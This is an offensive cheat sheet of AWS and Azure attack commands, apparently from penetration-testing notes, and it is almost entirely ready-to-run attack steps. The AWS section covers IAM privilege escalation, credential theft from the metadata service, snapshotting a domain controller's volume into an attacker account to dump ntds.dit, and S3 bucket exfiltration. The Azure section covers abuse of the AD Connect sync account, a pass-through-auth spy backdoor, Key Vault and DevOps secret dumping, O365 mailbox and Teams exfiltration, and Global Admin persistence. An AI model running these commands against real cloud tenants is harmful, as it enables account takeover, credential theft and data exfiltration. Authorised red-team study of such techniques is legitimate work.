# Cloud Attacks — AWS & Azure

## AWS

### Setup and Enumeration

```bash
# Setup credentials
aws configure  # sets ~/.aws/credentials
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=TOKEN  # for temporary credentials

# Enumerate IAM permissions of current creds
git clone https://github.com/andresriancho/enumerate-iam.git
python enumerate-iam.py --access-key KEY_ID --secret-key SECRET --region us-east-1

# Comprehensive audit tools
cloudfox aws --profile PROFILE all-checks       # BishopFox CloudFox
python scout.py aws --access-keys --access-key-id KEY --secret-access-key SECRET  # ScoutSuite
pmapper graph --create && pmapper analysis --output-type text  # PMapper (IAM privesc paths)
pacu  # Rhino Security PACU framework: set_keys → run module
```

### IAM Enumeration

```bash
aws iam list-users
aws iam list-groups
aws iam list-roles
aws iam list-access-keys
aws iam get-account-authorization-details > iam.json  # dump all IAM info
aws iam list-attached-user-policies --user-name USERNAME
aws iam get-policy-version --policy-arn ARN --version-id v1

# Assume role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE --role-session-name test
# Returns: AccessKeyId, SecretAccessKey, SessionToken

# Get current identity
aws sts get-caller-identity
```

### IAM Privilege Escalation (Shadow Admin Permissions)

```bash
# Create access key for target user → takeover
aws iam create-access-key --user-name TARGET_USER

# Add admin policy to own user
aws iam attach-user-policy --user-name MY_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create login profile (console access) for target user
aws iam create-login-profile --user-name TARGET_USER --password 'P@ss123!' --no-password-reset-required

# Associate IAM instance profile to EC2 (ec2:AssociateIamInstanceProfile)
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=admin-role --instance-id i-0123456789
```

### EC2 Metadata SSRF (IMDSv1)

```bash
# From inside EC2 or via SSRF: http://169.254.169.254/latest/meta-data/
# Step 1: Get IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 2: Get credentials for that role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

# IMDSv2 requires token (SSRF usually can't set headers)
export TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Fargate: read env for AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```

### EC2 Attacks

```bash
# List instances
aws ec2 describe-instances --region us-east-1

# Shadow Copy Attack (steal NTDS from DC running as EC2)
# Requires: ec2:CreateSnapshot
# 1. Create snapshot of target DC's EBS volume
aws ec2 create-snapshot --volume-id vol-XXXXX --description "audit"
# 2. Share snapshot with attacker account
aws ec2 modify-snapshot-attribute --snapshot-id snap-XXXXX --attribute createVolumePermission --operation-type add --user-ids ATTACKER_ACCOUNT_ID
# 3. In attacker account: create volume from snapshot, mount on Linux, extract ntds.dit
aws ec2 create-volume --snapshot-id snap-XXXXX --availability-zone us-east-1a
# 4. Mount and extract
sudo mount /dev/xvdf /mnt/windows
cp /mnt/windows/Windows/NTDS/ntds.dit .
cp /mnt/windows/Windows/System32/config/SYSTEM .
secretsdump.py -system SYSTEM -ntds ntds.dit local
```

### S3 Attacks

```bash
# Enumerate buckets
aws s3 ls
aws s3 ls s3://BUCKET_NAME/
aws s3 cp s3://BUCKET_NAME/file.txt .

# Check for public buckets
bucket_finder.rb wordlist.txt  # digi.ninja/bucket-finder
# Or guess: https://BUCKETNAME.s3.amazonaws.com

# Check object permissions
python s3-objects-check.py -p whitebox-profile -e blackbox-profile

# Download all bucket contents
aws s3 sync s3://BUCKET_NAME . --profile PROFILE
```

### SSM Command Execution

```bash
# List managed instances
aws ssm describe-instance-information --region eu-west-1

# Execute command
aws ssm send-command --instance-ids "i-INSTANCE_ID" --document-name "AWS-RunShellScript" --parameters commands='id; whoami' --query "Command.CommandId"

# Get command output
aws ssm list-command-invocations --command-id "COMMAND_ID" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}"
```

### Lambda Attacks

```bash
# List functions
aws lambda list-functions

# Get function code URL
aws lambda get-function --function-name FUNC_NAME --query 'Code.Location'
wget -O function.zip "URL_FROM_ABOVE"

# Invoke function
aws lambda invoke --function-name FUNC_NAME response.json

# API Gateway
aws apigateway get-rest-apis
aws apigateway get-api-keys --include-values
```

### Cognito Attacks

```python
import boto3
region = 'us-east-1'
identity_pool = 'us-east-1:5280c436-2198-2b5a-b87c-9f54094x8at9'

client = boto3.client('cognito-identity', region_name=region)
_id = client.get_id(IdentityPoolId=identity_pool)
credentials = client.get_credentials_for_identity(IdentityId=_id['IdentityId'])
# Gets temporary AWS credentials for unauthenticated role
print(credentials['Credentials'])

# Then use credentials to access AWS services
```

---

## Azure

### Setup and Enumeration Tools

```ps1
# az CLI
az login -u user@tenant.com -p Password123
az login --service-principal -u APP_ID -p SECRET --tenant TENANT_ID
az account get-access-token  # get current token
az ad signed-in-user show    # whoami

# Azure AD PowerShell
Connect-AzureAD -Credential $creds
Get-AzureADUser -All $true
Get-AzureADGroup -All $true

# Az PowerShell
Connect-AzAccount -Credential $creds
(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token

# ROADTools (comprehensive enum)
roadrecon auth --access-token TOKEN
roadrecon gather
roadrecon gui  # web UI at localhost:5000

# AzureHound (BloodHound for Azure)
./azurehound -u user@tenant.com -p Password list --tenant TENANT_ID -o output.json
./azurehound --refresh-token TOKEN list --tenant TENANT_ID -o output.json

# MicroBurst
Import-Module .\MicroBurst.psm1
Get-AzureDomainInfo -folder MicroBurst -Verbose
Get-AzurePasswords -Verbose | Out-GridView  # dump all secrets

# GraphRunner
Invoke-GraphRecon -Tokens $tokens -PermissionEnum
Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
Invoke-DumpApps -Tokens $tokens
```

### Access Token Operations

```ps1
# Key application IDs for token requests
# Azure PowerShell: 1950a258-227b-4e31-a9cf-717495945fc2
# Azure CLI: 04b07795-8ddb-461a-bbee-02f9e1bf7b46

# Refresh token to access token (BARK)
. .\BARK.ps1
$tokens = Get-AZRefreshTokenWithUsernamePassword -username user@tenant.com -password pass -TenantID tenant.onmicrosoft.com
$graphToken = Get-MSGraphTokenWithRefreshToken -RefreshToken $tokens.refresh_token -TenantID tenant.onmicrosoft.com

# ROADTx for token manipulation
roadtx auth --device-code -c APP_ID
roadtx refreshtokento -c 1950a258-227b-4e31-a9cf-717495945fc2 -r 499b84ac-1321-427f-aa17-267ca6975798/.default

# AADInternals
Import-Module AADInternals
Get-AADIntAccessTokenForMSGraph -SaveToCache
Invoke-AADIntReconAsOutsider -DomainName company.com  # recon without auth
```

### Azure AD Enumeration

```ps1
# Users, groups, apps
az ad user list --output table
az ad group list --output table
az ad app list --output table
az ad sp list --output table  # service principals

# Check role assignments
Get-AzRoleAssignment | Select DisplayName,RoleDefinitionName,Scope
az role assignment list --all --output table

# Find admin accounts
Get-AzureADDirectoryRole | ForEach-Object { Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId } | Select DisplayName,UserPrincipalName

# Conditional access policies
Invoke-DumpCAPS -Tokens $tokens -ResolveGuids  # GraphRunner
```

### Azure AD Connect Attacks

```ps1
# Check if AD Connect installed
Get-ADSyncConnector

# PHS (Password Hash Sync) - extract SYNC account creds
Import-Module AADInternals
Get-AADIntSyncCredentials  # returns SYNC_* account credentials

# Use SYNC account to reset on-prem admin password
$token = Get-AADIntAccessTokenForAADGraph -Credentials $syncCreds -SaveToCache
$immutableId = (Get-AADIntUser -UserPrincipalName admin@tenant.onmicrosoft.com).ImmutableId
Set-AADIntUserPassword -SourceAnchor $immutableId -Password "NewPass123!" -Verbose

# PTA (Pass-Through Auth) - install backdoor agent
Install-AADIntPTASpy
Get-AADIntPTASpyLog -DecodePasswords  # capture all auth in plaintext

# AD Connect credential dump (dirkjanm/adconnectdump)
# Run on AD Connect server with SYSTEM privileges
```

### Azure Key Vault

```ps1
# From managed identity / compromised app
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# Connect with token
Connect-AzAccount -AccessToken $mgmtToken -AccountId $accid -KeyVaultAccessToken $kvToken

# Enumerate and dump secrets
Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName VAULT_NAME
Get-AzKeyVaultSecret -VaultName VAULT_NAME -Name SECRET_NAME -AsPlainText

# MicroBurst - dump all secrets
Get-AzurePasswords -Verbose | Out-GridView
```

### Azure DevOps

```ps1
# ADOKit - Azure DevOps Attack Toolkit
ADOKit.exe whoami /credential:patToken /url:https://dev.azure.com/ORG
ADOKit.exe search-file /credential:patToken /url:https://dev.azure.com/ORG /search:password
ADOKit.exe get-pipeline-variables /credential:patToken /url:https://dev.azure.com/ORG

# Nord-stream - extract secrets from pipelines
nord-stream.py devops --token "$PAT" --org myorg --list-secrets
nord-stream.py devops --token "$PAT" --org myorg  # dump all secrets

# PAT token access
curl -u :$PAT https://dev.azure.com/ORG/_apis/build-release/builds
```

### Azure VM / Intune / Services

```ps1
# VM command execution (requires Contributor+)
Invoke-AzVMRunCommand -VMName TARGET_VM -ResourceGroupName RG -CommandId RunShellScript -ScriptString 'id'

# Intune (requires Global Admin / Intune Admin)
# Login to https://endpoint.microsoft.com → Devices → Scripts → Add PowerShell script → Deploy to all

# Extract Intune scripts (read-only)
Get-DeviceManagementScripts -FolderPath C:\temp

# Storage blobs
az storage account list
az storage blob list --account-name ACCOUNT --container-name CONTAINER

# Service Bus / App Services / Web Apps
az webapp list
az functionapp list
az appservice plan list
```

### Office 365 / Teams

```ps1
# Teams messages (AADInternals)
RefreshTo-MSTeamsToken -domain domain.local
Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,*type*,DisplayName

# Outlook (Microsoft Graph)
Get-MgUserMessage -UserId USER_ID | ft
Get-MgUserMessageContent -OutFile mail.txt -UserId USER_ID -MessageId MSG_ID

# OneDrive
Get-MgUserDefaultDrive -UserId USER_ID
Get-MgDrive -top 1

# TeamFiltration (O365 spray + exfil)
TeamFiltration.exe --outpath OUTPUT --config config.json --enum --validate-msol --usernames users.txt
TeamFiltration.exe --outpath OUTPUT --config config.json --exfil --teams --owa --owa-limit 5000
```

### Azure Persistence

```ps1
# Add global admin role
$userId = (Get-AzureADUser -UserPrincipalName 'attacker@tenant.com').ObjectId
$roleId = (Get-AzureADDirectoryRole | Where-Object {$_.displayName -eq 'Global Administrator'}).ObjectId
Add-AzureADDirectoryRoleMember -ObjectId $roleId -RefObjectId $userId

# Add credentials to service principal
$sp = Get-AzureADServicePrincipal -SearchString "TARGET_APP"
New-AzureADServicePrincipalPasswordCredential -ObjectId $sp.ObjectId -EndDate (Get-Date).AddYears(10)

# Golden SAML (ADFS → Azure) - see ad-adcs.md Golden SAML section

# PTA backdoor (requires code execution on AD Connect server)
Install-AADIntPTASpy  # logs all auth credentials
```
